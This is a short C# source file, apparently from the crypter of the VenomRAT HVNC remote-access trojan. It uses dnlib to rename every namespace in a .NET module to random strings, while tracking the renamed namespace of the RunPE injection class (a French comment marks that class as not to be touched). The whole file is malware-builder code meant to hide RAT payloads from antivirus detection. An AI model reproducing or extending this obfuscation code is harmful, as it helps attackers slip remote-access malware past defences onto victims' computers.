using System;
using dnlib.DotNet;
using VenomRAT_HVNC.Crypter.Settings;

namespace Client.Obfuscation.SimpleTechObfuscate;

public class NameSpace
{
    public static void Obfuscate (ModuleDef md)
    {
        foreach (var type in md.GetTypes())
        {
            string encName = new GenerateKey(10).GenerateStrenghCharacter();
            if (type.Namespace == Settings.NamespaceRunPe) // Ne pas toucher la classe main RunPE
            {
                Settings.NamespaceRunPe = encName;
                type.Namespace = Settings.NamespaceRunPe;
                continue;
            }

            type.Namespace = encName;
        }
    }
}